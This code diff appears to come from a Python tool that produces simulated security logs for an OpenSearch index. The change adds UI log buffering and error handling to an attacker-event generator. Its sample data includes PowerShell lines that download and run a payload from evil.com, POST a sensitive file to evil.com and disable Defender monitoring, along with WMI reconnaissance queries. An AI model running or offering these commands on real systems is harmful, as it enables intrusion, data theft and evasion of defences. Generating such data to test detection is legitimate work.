@@ -5,6 +5,9 @@ import random
 import opensearchpy
 from time import sleep
 
+from ui import MainWindow
+
+
 def check_ip_address_list(ip_address, ip_address_list):
     if ip_address not in ip_address_list:
         return True
@@ -978,7 +981,7 @@ def generator_device(count_users, category, header, subnetwork, tail=0):
 
 
 
-def generator_protocols(client, index_name, users, list_ip_addr, list_mac_addr, stop_event, attacker_code):
+def generator_protocols(client, index_name, users, list_ip_addr, list_mac_addr, stop_event, attacker_code, ui : MainWindow):
 
     # --- ATTENTION! --- USE IN INFINITELY LOOP! --- ONE-TIME ACTION! ---
 
@@ -1308,7 +1311,7 @@ def generator_protocols(client, index_name, users, list_ip_addr, list_mac_addr, 
                 operations_index += 1
             elif operation == 19:
                 print(f"{operations_index}, {operation} | violation_traffic_info" , end=" > ")
-                logs = (user.violation_traffic_info(list_mac_addr))
+                logs = (user.violation_traffic_info(list_ip_addr))
                 network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                 operations_index += 1
             elif operation == 20:
@@ -1374,156 +1377,155 @@ def generator_protocols(client, index_name, users, list_ip_addr, list_mac_addr, 
                 logs = (user.vpn_tunnel_warning())
                 network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                 operations_index += 1
+
         # --- ATTACKER ---
+
         elif type(user) == entity.Attacker:
-            #print("Firewall -> ", end="")
-            if attacker_code == 1:
-                print(f"{operations_index}, {attacker_code} | ssh_bruteforce", end=" > ")
-                logs = user.ssh_bruteforce(random.choice(list_ip_addr))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 2:
-                print(f"{operations_index}, {attacker_code} | rdp_bruteforce", end=" > ")
-                logs = user.rdp_bruteforce(random.choice(list_ip_addr))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 3:
-                print(f"{operations_index}, {attacker_code} | data_exfiltration", end=" > ")
-                logs = user.data_exfiltration(random.choice(list_ip_addr),exfiltrated_data_size_bytes=random.choice(["200 MB", "1.2 GB", "150 MB", "96.8 MB", "3 GB", "25 GB", "200 KB", "1000 GB"]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 4:
-                print(f"{operations_index}, {attacker_code} | living_off_the_land_powershell", end=" > ")
-                logs = user.living_off_the_land_powershell(target_command = random.choice([
-    "Get-Process",
-    "Get-Service | Where-Object {$_.Status -eq 'Running'}",
-    "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
-    "Invoke-WebRequest -Uri http://evil.com/exfil -Method POST -Body (Get-Content C:\\sensitive_data.txt)",
-    "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address",
-    "Get-LocalUser",
-    "Get-EventLog -LogName Security -Newest 10",
-    "Get-NetFirewallRule -Enabled True -Action Allow",
-    "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-    "Start-Process -FilePath 'C:\\temp\\malware.exe'",
-    "Enable-PSRemoting -Force",
-    "Get-ADComputer -Filter *",
-    "Set-MpPreference -DisableRealtimeMonitoring $true"
-]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 5:
-                print(f"{operations_index}, {attacker_code} | living_off_the_land_wmi", end=" > ")
-                logs = user.living_off_the_land_wmi(target_wmi_query = random.choice([
-    "SELECT * FROM Win32_Process WHERE Name='cmd.exe'",  # Поиск активных cmd-сессий
-    "SELECT * FROM Win32_Service WHERE State='Running' AND Name LIKE '%svchost%'",  # Сбор информации о системных сервисах
-    "SELECT Name, ProcessId FROM Win32_Process WHERE ExecutablePath LIKE '%\\temp\\%'",  # Поиск процессов из временных папок
-    "SELECT * FROM Win32_LogonSession WHERE LogonType=3",  # Поиск сетевых сессий (вход через сеть)
-    "SELECT * FROM Win32_UserAccount WHERE Name='Administrator'",  # Проверка наличия администратора
-    "SELECT IPAddress, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE",  # Сбор сетевой конфигурации
-    "SELECT * FROM CIM_DataFile WHERE Name LIKE 'C:\\\\Users\\\\%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\%'",  # Поиск недавних файлов
-    "SELECT CommandLine FROM Win32_Process WHERE Name='powershell.exe'",  # Получение командной строки PowerShell (для детектирования вредоносного кода)
-    "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%USB%'",  # Обнаружение подключенных USB-устройств
-    "SELECT * FROM Win32_Share WHERE Name='C$' OR Name='ADMIN$'",  # Поиск административных общих ресурсов
-    "SELECT * FROM Win32_StartupCommand WHERE Location='HKLM' OR Location='HKCU'",  # Поиск автозагрузки (persistent backdoor)
-    "SELECT * FROM Win32_TerminalServiceSetting WHERE AllowTSConnections=1",  # Проверка включенного RDP
-    "SELECT * FROM Win32_ComputerSystem WHERE DomainRole > 1",  # Определение, является ли хост контроллером домена
-    "SELECT * FROM Win32_LogicalDisk WHERE DriveType=3",  # Перечисление локальных дисков
-    "SELECT * FROM Win32_Printer WHERE Shared=TRUE",  # Поиск общих принтеров (возможная точка атаки)
-    "SELECT Name, Path FROM Win32_Service WHERE StartMode='Auto' AND State='Running'",  # Все автозапускаемые службы
-    "SELECT * FROM Win32_ComputerSystemProduct WHERE IdentifyingNumber != ''",  # Получение серийного номера машины
-    "SELECT * FROM Win32_OperatingSystem WHERE Caption LIKE '%Server%'",  # Определение ОС сервера
-    "SELECT * FROM Win32_NTEventLogFile WHERE LogFileName='Security'",  # Проверка доступности журнала безопасности
-    "SELECT * FROM Win32_SystemDriver WHERE State='Running' AND Name LIKE '%vss%' OR Name LIKE '%shadow%'"  # Поиск служб теневого копирования (для обхода защиты)
-]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 6:
-                print(f"{operations_index}, {attacker_code} | cam_overflow", end=" > ")
-                trust_ip = []
-                for ip in list_ip_addr:
-                    if "192.168." in ip  and ".1" in ip:
-                        trust_ip.append(ip)
-                logs = user.cam_overflow(random.choice(trust_ip), switch_port = random.choice([
-    "Fa1/1",        # FastEthernet 1/1
-    "Fa1/24",       # FastEthernet 1/24
-    "Gi1/0/1",      # GigabitEthernet 1/0/1
-    "Gi1/0/48",     # GigabitEthernet 1/0/48
-    "Te1/1/1",      # TenGigabitEthernet 1/1/1
-    "Eth1/3",       # Универсальный формат Ethernet (часто используется в документации и некоторых системах)
-    "Fa0/5",        # FastEthernet 0/5 (другой модуль)
-    "Gi2/1/10",     # GigabitEthernet 2/1/10 (модуль 2, модуль подключения 1, порт 10)
-    "Vlan100",      # Виртуальный интерфейс VLAN (иногда упоминается в логах при событиях STP, ACL и др.)
-    "Port-channel1", # Логический агрегированный канал (LACP)
-    "Loopback0",    # Лупбэк-интерфейс (в логах маршрутизаторов/управляемых коммутаторов)
-    "Null0"         # NULL-интерфейс (редко, но может появляться в контексте маршрутов)
-]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 7:
-                print(f"{operations_index}, {attacker_code} | unauthorized_acl_modification", end=" > ")
-                trust_ip = []
-                for ip in list_ip_addr:
-                    if "10." in ip and ".1" in ip:
-                        trust_ip.append(ip)
-                logs = user.unauthorized_acl_modification(random.choice(trust_ip), target_acl_name = random.choice([
-    "BLOCK_MALICIOUS_IPS",           # Блокировка известных вредоносных IP
-    "ALLOW_WEB_TRAFFIC",             # Разрешение HTTP/HTTPS
-    "DENY_PRIVATE_SUBNETS",          # Запрет трафика в приватные подсети извне
-    "PERMIT_SSH_FROM_MGMT",          # Разрешение SSH только с управляющей подсети
-    "RESTRICT_FILE_SHARING",         # Блокировка SMB/NetBIOS
-    "ACL_INTERNET_ACCESS",           # Общий ACL для доступа в интернет
-    "BLOCK_TOR_AND_PROXY",           # Запрет трафика к Tor и прокси-серверам
-    "ALLOW_DNS_QUERIES",             # Разрешение DNS-запросов
-    "DENY_ICMP_FLOOD",               # Ограничение ICMP для защиты от флуда
-    "PERMIT_BACKUP_TRAFFIC",         # Разрешение трафика для систем резервного копирования
-    "ACL-101",                       # Стандартное числовое имя ACL (Cisco)
-    "INSIDE_TO_DMZ",                 # Контроль доступа из внутренней сети в DMZ
-    "DENY_INTERNAL_SCANNING",        # Запрет внутреннего сканирования портов
-    "ALLOW_CLOUD_SYNC",              # Разрешение трафика для облачных сервисов (Dropbox, OneDrive)
-    "BLOCK_CRYPTO_MINERS",           # Блокировка известных пулов майнинга
-    "PERMIT_NTP_SYNC",               # Разрешение NTP-трафика
-    "DENY_ANONYMOUS_TRAFFIC",        # Запрет трафика без идентификации
-    "ACL-GUEST-WIFI",                # Ограничения для гостевой Wi-Fi сети
-    "ALLOW_MONITORING_TOOLS",        # Разрешение SNMP, NetFlow и пр.
-    "BLOCK_ADULT_CONTENT"            # Фильтрация трафика к нежелательному контенту
-]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 8:
-                print(f"{operations_index}, {attacker_code} | stp_root_bridge_hijacking", end=" > ")
-                trust_ip = []
-                for ip in list_ip_addr:
-                    if "192.168." in ip  and ".1" in ip:
-                        trust_ip.append(ip)
-                logs = user.stp_root_bridge_hijacking(random.choice(trust_ip))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 9:
-                print(f"{operations_index}, {attacker_code} | rogue_dhcp_server", end=" > ")
-                logs = user.rogue_dhcp_server(random.choice([1,2,3]))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 10:
-                print(f"{operations_index}, {attacker_code} | route_injection", end=" > ")
-                trust_ip = []
-                for ip in list_ip_addr:
-                    if "10." in ip and ".1" in ip:
-                        trust_ip.append(ip)
-                logs = user.route_injection(random.choice(trust_ip))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-            elif attacker_code == 11:
-                print(f"{operations_index}, {attacker_code} | snmp_bruteforce", end=" > ")
-                trust_ip = []
-                for ip in list_ip_addr:
-                    if "10." in ip and ".1" in ip:
-                        trust_ip.append(ip)
-                logs = user.snmp_bruteforce(random.choice(trust_ip))
-                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
-                operations_index += 1
-
-
-
+            try:
+                if attacker_code == 1:
+                    print(f"{operations_index}, {attacker_code} | ssh_bruteforce", end=" > ")
+                    logs = user.ssh_bruteforce(random.choice(list_ip_addr))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 2:
+                    print(f"{operations_index}, {attacker_code} | rdp_bruteforce", end=" > ")
+                    logs = user.rdp_bruteforce(random.choice(list_ip_addr))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 3:
+                    print(f"{operations_index}, {attacker_code} | data_exfiltration", end=" > ")
+                    logs = user.data_exfiltration(random.choice(list_ip_addr),exfiltrated_data_size_bytes=random.choice(["200 MB", "1.2 GB", "150 MB", "96.8 MB", "3 GB", "25 GB", "200 KB", "1000 GB"]))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 4:
+                    print(f"{operations_index}, {attacker_code} | living_off_the_land_powershell", end=" > ")
+                    logs = user.living_off_the_land_powershell(target_command = random.choice([
+        "Get-Process",
+        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
+        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+        "Invoke-WebRequest -Uri http://evil.com/exfil -Method POST -Body (Get-Content C:\\sensitive_data.txt)",
+        "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address",
+        "Get-LocalUser",
+        "Get-EventLog -LogName Security -Newest 10",
+        "Get-NetFirewallRule -Enabled True -Action Allow",
+        "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "Start-Process -FilePath 'C:\\temp\\malware.exe'",
+        "Enable-PSRemoting -Force",
+        "Get-ADComputer -Filter *",
+        "Set-MpPreference -DisableRealtimeMonitoring $true"
+    ]))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 5:
+                    print(f"{operations_index}, {attacker_code} | living_off_the_land_wmi", end=" > ")
+                    logs = user.living_off_the_land_wmi(target_wmi_query = random.choice([
+        "SELECT * FROM Win32_Process WHERE Name='cmd.exe'",  # Поиск активных cmd-сессий
+        "SELECT * FROM Win32_Service WHERE State='Running' AND Name LIKE '%svchost%'",  # Сбор информации о системных сервисах
+        "SELECT Name, ProcessId FROM Win32_Process WHERE ExecutablePath LIKE '%\\temp\\%'",  # Поиск процессов из временных папок
+        "SELECT * FROM Win32_LogonSession WHERE LogonType=3",  # Поиск сетевых сессий (вход через сеть)
+        "SELECT * FROM Win32_UserAccount WHERE Name='Administrator'",  # Проверка наличия администратора
+        "SELECT IPAddress, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE",  # Сбор сетевой конфигурации
+        "SELECT * FROM CIM_DataFile WHERE Name LIKE 'C:\\\\Users\\\\%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\%'",  # Поиск недавних файлов
+        "SELECT CommandLine FROM Win32_Process WHERE Name='powershell.exe'",  # Получение командной строки PowerShell (для детектирования вредоносного кода)
+        "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%USB%'",  # Обнаружение подключенных USB-устройств
+        "SELECT * FROM Win32_Share WHERE Name='C$' OR Name='ADMIN$'",  # Поиск административных общих ресурсов
+        "SELECT * FROM Win32_StartupCommand WHERE Location='HKLM' OR Location='HKCU'",  # Поиск автозагрузки (persistent backdoor)
+        "SELECT * FROM Win32_TerminalServiceSetting WHERE AllowTSConnections=1",  # Проверка включенного RDP
+        "SELECT * FROM Win32_ComputerSystem WHERE DomainRole > 1",  # Определение, является ли хост контроллером домена
+        "SELECT * FROM Win32_LogicalDisk WHERE DriveType=3",  # Перечисление локальных дисков
+        "SELECT * FROM Win32_Printer WHERE Shared=TRUE",  # Поиск общих принтеров (возможная точка атаки)
+        "SELECT Name, Path FROM Win32_Service WHERE StartMode='Auto' AND State='Running'",  # Все автозапускаемые службы
+        "SELECT * FROM Win32_ComputerSystemProduct WHERE IdentifyingNumber != ''",  # Получение серийного номера машины
+        "SELECT * FROM Win32_OperatingSystem WHERE Caption LIKE '%Server%'",  # Определение ОС сервера
+        "SELECT * FROM Win32_NTEventLogFile WHERE LogFileName='Security'",  # Проверка доступности журнала безопасности
+        "SELECT * FROM Win32_SystemDriver WHERE State='Running' AND Name LIKE '%vss%' OR Name LIKE '%shadow%'"  # Поиск служб теневого копирования (для обхода защиты)
+    ]))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 6:
+                    print(f"{operations_index}, {attacker_code} | cam_overflow", end=" > ")
+                    trust_ip = []
+                    for ip in list_ip_addr:
+                        if "192.168." in ip  and ".1" in ip:
+                            trust_ip.append(ip)
+                    logs = user.cam_overflow(random.choice(trust_ip), switch_port = random.randint(20, 25000))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 7:
+                    print(f"{operations_index}, {attacker_code} | unauthorized_acl_modification", end=" > ")
+                    trust_ip = []
+                    for ip in list_ip_addr:
+                        if "10." in ip and ".1" in ip:
+                            trust_ip.append(ip)
+                    logs = user.unauthorized_acl_modification(random.choice(trust_ip), target_acl_name = random.choice([
+        "BLOCK_MALICIOUS_IPS",           # Блокировка известных вредоносных IP
+        "ALLOW_WEB_TRAFFIC",             # Разрешение HTTP/HTTPS
+        "DENY_PRIVATE_SUBNETS",          # Запрет трафика в приватные подсети извне
+        "PERMIT_SSH_FROM_MGMT",          # Разрешение SSH только с управляющей подсети
+        "RESTRICT_FILE_SHARING",         # Блокировка SMB/NetBIOS
+        "ACL_INTERNET_ACCESS",           # Общий ACL для доступа в интернет
+        "BLOCK_TOR_AND_PROXY",           # Запрет трафика к Tor и прокси-серверам
+        "ALLOW_DNS_QUERIES",             # Разрешение DNS-запросов
+        "DENY_ICMP_FLOOD",               # Ограничение ICMP для защиты от флуда
+        "PERMIT_BACKUP_TRAFFIC",         # Разрешение трафика для систем резервного копирования
+        "ACL-101",                       # Стандартное числовое имя ACL (Cisco)
+        "INSIDE_TO_DMZ",                 # Контроль доступа из внутренней сети в DMZ
+        "DENY_INTERNAL_SCANNING",        # Запрет внутреннего сканирования портов
+        "ALLOW_CLOUD_SYNC",              # Разрешение трафика для облачных сервисов (Dropbox, OneDrive)
+        "BLOCK_CRYPTO_MINERS",           # Блокировка известных пулов майнинга
+        "PERMIT_NTP_SYNC",               # Разрешение NTP-трафика
+        "DENY_ANONYMOUS_TRAFFIC",        # Запрет трафика без идентификации
+        "ACL-GUEST-WIFI",                # Ограничения для гостевой Wi-Fi сети
+        "ALLOW_MONITORING_TOOLS",        # Разрешение SNMP, NetFlow и пр.
+        "BLOCK_ADULT_CONTENT"            # Фильтрация трафика к нежелательному контенту
+    ]))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 8:
+                    print(f"{operations_index}, {attacker_code} | stp_root_bridge_hijacking", end=" > ")
+                    trust_ip = []
+                    for ip in list_ip_addr:
+                        if "192.168." in ip  and ".1" in ip:
+                            trust_ip.append(ip)
+                    logs = user.stp_root_bridge_hijacking(random.choice(trust_ip))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 9:
+                    print(f"{operations_index}, {attacker_code} | rogue_dhcp_server", end=" > ")
+                    logs = user.rogue_dhcp_server(random.choice([1,2,3]))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 10:
+                    print(f"{operations_index}, {attacker_code} | route_injection", end=" > ")
+                    trust_ip = []
+                    for ip in list_ip_addr:
+                        if "10." in ip and ".1" in ip:
+                            trust_ip.append(ip)
+                    logs = user.route_injection(random.choice(trust_ip))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+                elif attacker_code == 11:
+                    print(f"{operations_index}, {attacker_code} | snmp_bruteforce", end=" > ")
+                    trust_ip = []
+                    for ip in list_ip_addr:
+                        if "10." in ip and ".1" in ip:
+                            trust_ip.append(ip)
+                    logs = user.snmp_bruteforce(random.choice(trust_ip))
+                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
+                    ui.buffer_log(data=logs, index=operations_index)
+                    operations_index += 1
+            except Exception as e:
+                print(f"Error: {e}")
 
         else:
             print("Stop!")
